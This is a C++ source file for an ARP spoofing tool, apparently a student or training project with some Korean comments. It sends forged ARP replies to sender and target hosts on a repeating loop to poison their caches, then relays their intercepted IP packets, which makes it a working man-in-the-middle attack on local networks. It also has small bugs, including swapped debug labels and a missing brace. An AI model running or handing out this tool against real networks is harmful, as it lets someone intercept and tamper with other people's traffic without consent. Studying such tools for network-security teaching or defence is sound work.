#include <cstdio>
#include <stdio.h>
#include <string.h>
#include <ifaddrs.h>
#include <iostream>
#include <list>
#include <map>
#include <thread>
#include <vector>
#include <signal.h>
#include <fcntl.h>
#include <unistd.h>
#include <pcap.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include "ethhdr.h"
#include "arphdr.h"

struct IpHdr final {
    uint8_t version:4;
    uint8_t header_length:4;
    uint8_t tos;

    uint16_t total_length;
    uint16_t identification;
    
    uint8_t flags:3;
    uint16_t fragment_offset:13;

    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    
    Ip sip;
    Ip dip;
};

struct EthArpPacket{
    EthHdr eth_;
    ArpHdr arp_;
};

struct EthIpPacket{
    EthHdr eth_;
    IpHdr ip_;
};

struct SpoofTable{
	Ip a_ip;
	Ip s_ip;
	Ip t_ip;
	Mac a_mac;
	Mac s_mac;
	Mac t_mac;
	EthArpPacket spoofedPacket;
};

bool isThread = true;
Ip a_ip;
Mac a_mac;
std::map<Ip, Mac> arpTable; // ip -> mac
std::list<SpoofTable> tables;

void signal_handler (int signo);
void InitTable(SpoofTable* table, Ip aIp, Mac aMac, Ip sIp, Ip tIp);
void get_a_mac_ip(const char* dev);
EthArpPacket initEthArpPacket_REQ(Mac sMac, Ip sIp, Ip tIp);
EthArpPacket initEthArpPacket_REP(Mac sMac, Mac dMac, Ip sIp, Ip tIp);
Mac getMac(pcap_t* handle, Mac aMac, Ip aIP, Ip sIp);
void sendArpPacket(pcap_t* handle, EthArpPacket packet);
void sendIpPacket(pcap_t* handle, const u_char *packet, int size);
void infect(pcap_t* handle);
void reInfect(pcap_t* handle, SpoofTable sTable);
bool needsRecover(EthHdr* ethpkt, SpoofTable sTable);
bool needsRelay(EthHdr* ethpkt, SpoofTable sTable);
void receive_relay(pcap_t* handle);


void signal_handler (int signo)
{
    printf("\nInterrupt Executed : %d\n",signo);
    isThread = false;
	sleep(2);
}
void InitTable(SpoofTable* table, Ip aIp, Mac aMac, Ip sIp, Ip tIp)
{
	(*table).a_ip = aIp;
	(*table).a_mac = aMac;
	(*table).s_ip = sIp;
	(*table).t_ip = tIp;
}

void get_a_mac_ip(const char* dev)
{
    struct ifreq ifr;
	int s;
	s = socket(AF_INET, SOCK_DGRAM, 0);

    if (s == -1)
    {
        perror("socket creation failed");
        exit(-1);
    }

	ifr.ifr_addr.sa_family = AF_INET;

    memcpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (!ioctl(s, SIOCGIFHWADDR, &ifr)) a_mac = Mac((uint8_t*)(ifr.ifr_hwaddr.sa_data));
    if (!ioctl(s, SIOCGIFADDR, &ifr)) a_ip = Ip(std::string(inet_ntoa(((struct sockaddr_in* )&ifr.ifr_addr)->sin_addr)));
	close(s);
	return;
}

EthArpPacket initEthArpPacket_REQ(Mac sMac, Ip sIp, Ip tIp)
{
	EthArpPacket p;
	p.eth_.smac_ = sMac;
    p.eth_.dmac_ = Mac::broadcastMac();
    p.eth_.type_ = htons(EthHdr::Arp);
    p.arp_.hrd_ = htons(ArpHdr::ETHER);
    p.arp_.pro_ = htons(EthHdr::Ip4);
    p.arp_.hln_ = Mac::SIZE;
    p.arp_.pln_ = Ip::SIZE;
    p.arp_.op_ = htons(ArpHdr::Request);
    p.arp_.smac_ = sMac;
    p.arp_.tmac_ = Mac::nullMac();
    p.arp_.sip_ = htonl(sIp);
    p.arp_.tip_ = htonl(tIp);
	return p;
}

EthArpPacket initEthArpPacket_REP(Mac sMac, Mac dMac, Ip sIp, Ip tIp)
{
    EthArpPacket p;
    p.eth_.smac_ = sMac;
    p.eth_.dmac_ = dMac;
    p.eth_.type_ = htons(EthHdr::Arp);
    p.arp_.hrd_ = htons(ArpHdr::ETHER);
    p.arp_.pro_ = htons(EthHdr::Ip4);
    p.arp_.hln_ = Mac::SIZE;
    p.arp_.pln_ = Ip::SIZE;
    p.arp_.op_ = htons(ArpHdr::Reply);
    p.arp_.smac_ = sMac;
    p.arp_.tmac_ = dMac;
    p.arp_.sip_ = htonl(sIp);
    p.arp_.tip_ = htonl(tIp);
    return p;
}

Mac getMac(pcap_t* handle, Mac aMac, Ip aIp, Ip sIp)
{
	struct pcap_pkthdr* header;
    const u_char* packet_REP;

	while(true)
	{
		EthArpPacket packet_REQ = initEthArpPacket_REQ(aMac, aIp, sIp);
		sendArpPacket(handle, packet_REQ);

		int res = pcap_next_ex(handle, &header, &packet_REP);
		if (res == 0) return Mac(0);
		if (res == PCAP_ERROR_BREAK || res == PCAP_ERROR)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			exit(-1);
		}
		EthArpPacket* packet_res;

		packet_res = (struct EthArpPacket *)packet_REP;
		if(packet_res->eth_.type() == EthHdr::Arp){
			if(packet_res->arp_.sip() == sIp && packet_res->arp_.tip() == aIp)
				return Mac((uint8_t*)(packet_res->arp_.smac_));
			else continue;
		}
	}
		
	return Mac(0);
}

void sendArpPacket(pcap_t* handle, EthArpPacket packet)
{
	//int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if(0 != pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)))
	{
		printf("sendArpPacket fail, return %d(%s)\n", -1, pcap_geterr(handle));
	}
	return;
}
void sendIpPacket(pcap_t* handle, const u_char* packet, int size) // ip는 사이즈 지정해서 보내야 함
{
	if(0 != pcap_sendpacket(handle, packet, size))
	{
		printf("sendIpPacket fail, return %d(%s)\n", -1, pcap_geterr(handle));
	}
	return;
}

void infect(pcap_t* handle)
{
	while(isThread)
	{
		for(auto iter: tables)
		{
			sendArpPacket(handle, iter.spoofedPacket);
			sleep(0.1); //debug
		}
		sleep(20); //debug
	}
}

void reInfect(pcap_t* handle, SpoofTable sTable)
{
	sendArpPacket(handle, sTable.spoofedPacket);
}

bool needsRecover(EthHdr* ethpkt, SpoofTable sTable)
{
	if(ethpkt->type() != EthHdr::Arp) return false;
	EthArpPacket* packet = (EthArpPacket*) ethpkt;
	if(packet->arp_.op() == ArpHdr::Request && packet->arp_.tip() == sTable.t_ip) return true;
	else return false;
}

bool needsRelay(EthHdr* ethpkt, SpoofTable sTable)
{
	if(ethpkt->type() != EthHdr::Ip4) return false;
	EthIpPacket* packet = (EthIpPacket*) ethpkt;
	// sip는 굳이 안봐줌
	if(packet->eth_.smac() == sTable.s_mac && packet->ip_.dip != sTable.a_ip) return true;
	
	else return false;
}

void receive_relay(pcap_t* handle)
{
	struct pcap_pkthdr* header;
    const u_char* packet_REP;

	while(isThread)
	{
		int res = pcap_next_ex(handle, &header, &packet_REP);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }

        EthHdr *EthPacket = (EthHdr *)packet_REP;

		for(auto iter: tables)
		{

			if(needsRelay(EthPacket, iter))
			{
				printf("relay\n");
				EthIpPacket* packet = (EthIpPacket*) EthPacket;
				packet->eth_.smac_ = iter.a_mac;
				packet->eth_.dmac_ = iter.t_mac;
				sendIpPacket(handle, packet_REP, header->len);
			}

			if(needsRecover(EthPacket, iter))
				printf("zz..\n");
				sendArpPacket(handle, iter.spoofedPacket);

		}
	}
}


int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2) {
		printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
		printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
		return -1;
	}
	char* dev = argv[1];
	
	
	get_a_mac_ip(argv[1]);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	

	//make spoofed Packet;
	for(int i = 1;i < (argc/2);i++){

		
		SpoofTable sTable;
		EthArpPacket a;
		
		InitTable(&sTable, a_ip, a_mac, Ip(argv[2*i]), Ip(argv[2*i+1]));

		if(!arpTable.count(sTable.s_ip))
			arpTable[sTable.s_ip] = getMac(handle, a_mac, a_ip, sTable.s_ip);
		sTable.s_mac = arpTable[sTable.s_ip];
		if(!arpTable.count(sTable.t_ip))
			arpTable[sTable.t_ip] = getMac(handle, a_mac, a_ip, sTable.t_ip);
		sTable.t_mac = arpTable[sTable.t_ip];

		sTable.spoofedPacket = initEthArpPacket_REP(sTable.a_mac, sTable.s_mac, sTable.t_ip, sTable.s_ip);
		tables.push_back(sTable);

		//debug
		printf("s_ip\t\t= %s\n", std::string(sTable.s_mac).c_str());
		printf("s_mac\t\t= %s\n\n", std::string(sTable.s_ip).c_str());

		printf("t_ip\t\t= %s\n", std::string(sTable.t_mac).c_str());
		printf("t_mac\t\t= %s\n", std::string(sTable.t_ip).c_str());
	}

	printf("thread start\n");
	std::thread thread_infect(infect, handle);
	std::thread thread_relay(receive_relay, handle);

	signal(SIGINT, signal_handler);

    thread_infect.join();
	thread_relay.join();

	pcap_close(handle);
}
